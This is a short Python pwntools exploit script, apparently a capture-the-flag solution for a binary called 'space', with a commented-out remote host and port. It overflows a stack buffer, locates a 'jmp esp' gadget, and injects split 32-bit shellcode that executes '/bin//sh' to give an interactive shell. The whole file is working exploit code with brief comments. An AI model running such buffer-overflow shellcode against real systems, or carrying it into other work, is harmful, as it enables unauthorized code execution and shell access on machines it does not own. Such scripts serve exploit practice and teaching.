from pwn import *

elf = ELF('./space')
io = elf.process()
#io = remote('64.227.39.88', '30760')
offset = 18

payload = b'A'*offset + p64(elf.symbols.main)

jmp_esp_asm = asm("jmp esp")
jmp_esp = next(elf.search(jmp_esp_asm))
jmp_esp = p32(jmp_esp)

jmp_eax_asm = asm("jmp eax")
sub_esp_0x20_asm = asm("sub esp, 0x20")

shellcode = b"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x6a\x0b\x58\xcd\x80\x31\xd2\x31\xc9"

payload = [
	asm("push edx"), 			#2 >> \x52 (push null byte onto stack as string terminator)
	asm("push 0x68732f2f"),		#4 >> \x68\x2f\x2f\x73\x68 (push "/bin//sh")
	asm("push 0x6e69622f"),		#	  \x68\x2f\x62\x69\x6e
	asm("mov ebx,esp"),			#5 >> \x89\xe3 (set ebx, the 1st arg, with "/bin//sh\0")
	asm("push 0x0b"),			#6 >> \x6a\x0b
	asm("pop eax"),				#7 >> \x58     (set to use sys_execve)
	asm("int 0x80"),			#8 >> \xcd\x80
	jmp_esp,
	asm("xor edx,edx"), 		#1 >> \x31\xd2 (set that there is no 3rd arg)
	asm("xor ecx,ecx"),			#3 >> \x31\xc9 (set that there is no 2nd arg)
	sub_esp_0x20_asm,
	jmp_eax_asm
]

payload = b''.join(payload)

io.sendline(payload)

io.interactive()